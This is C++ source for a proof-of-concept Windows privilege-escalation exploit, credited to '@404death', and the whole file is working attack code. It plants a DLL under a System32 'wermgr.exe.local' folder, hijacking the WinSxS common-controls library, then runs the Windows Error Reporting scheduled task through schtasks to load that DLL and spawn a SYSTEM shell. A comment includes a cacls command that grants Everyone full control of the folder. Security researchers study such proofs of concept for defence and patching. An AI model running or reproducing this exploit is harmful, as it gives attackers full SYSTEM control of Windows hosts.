// dircreate2system.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <Shlwapi.h>
#include <iostream>
#include <fileapi.h>
#include <strsafe.h>
#include <tchar.h>>
#include <Winuser.h> 
#include <wchar.h>


#pragma comment(lib, "Shlwapi.lib")

using namespace std;

int main()
{
    LPCWSTR path = (L"C:\\Windows\\System32\\wermgr.exe.local");

    if (PathFileExists(path))
    {
        //MessageBox(NULL, L"This file exists", L"File exists", MB_OK);
		//wprintf(L":\n");
		wprintf(L"\n[+] Arbitrary Directory Creation to SYSTEM Shell technique !\n");
		wprintf(L"\n[+] Poc By @404death \n");
		WIN32_FIND_DATA FindFileData;
		HANDLE hFind;
		hFind = FindFirstFile(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6*", &FindFileData);
		wchar_t BeginPath[MAX_PATH] = L"C:\\Windows\\WinSxS\\";
		wchar_t CommonControlsFolder[MAX_PATH];
		wchar_t EndPath[23] = L"\\comctl32.dll";
		wmemcpy(CommonControlsFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
		FindClose(hFind);
		wcscat_s(BeginPath, CommonControlsFolder);
		wcscat_s(BeginPath, EndPath);

		//CommonControlsFolder
		//wprintf_s(CommonControlsFolder);
		wchar_t lpStrsyspath[MAX_PATH] = L"C:\\windows\\system32\\wermgr.exe.local\\"; //cacls C:\\windows\\system32\\wermgr.exe.local /e /g everyone:f
		wcscat_s(lpStrsyspath, CommonControlsFolder);
		wprintf(L"\n[+] Finding directory to hijack....\n");
		Sleep(2000);
		//wchar_t test = lpStrsyspath;
		//CreateDirectoryW(lpStrsyspath, NULL);
		if (!CreateDirectoryW(lpStrsyspath, NULL))
		{
			wprintf(L"\nCouldn't create %S directory.\n", lpStrsyspath);
		}
		else
		{
			wprintf(L"\n[+] directory successfully created.\n", lpStrsyspath);
		}

		wcscat_s(lpStrsyspath, EndPath);
		wprintf(L"\n[+] Copying dll file to created directory....\n");
		Sleep(1000);
		if (!CopyFileW(L"spawn.dll", lpStrsyspath, true))
		{
			wprintf(L"\nCouldn't create %S File.\n", lpStrsyspath);
		}
		else
		{
			wprintf(L"\n[+] Dll File successfully created.\n", lpStrsyspath);
			Sleep(1000);
		}
		//CopyFileW(L"spawn.dll", lpStrsyspath, true);

		//MessageBox(0, lpStrsyspath, L"path!!!", MB_OK);
		WinExec("cmd /c SCHTASKS /RUN /TN \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" > nul 2>&1", 0);
		wprintf(L"\n[+] Spawning SYSTEM shell...\n");
		return 0;
    }
    else
    {
        MessageBox(NULL, L"[+] Exploitable directory doesn't exist !!!", L"Folder Doesn't exists", MB_OK);
    }
    return 0;
}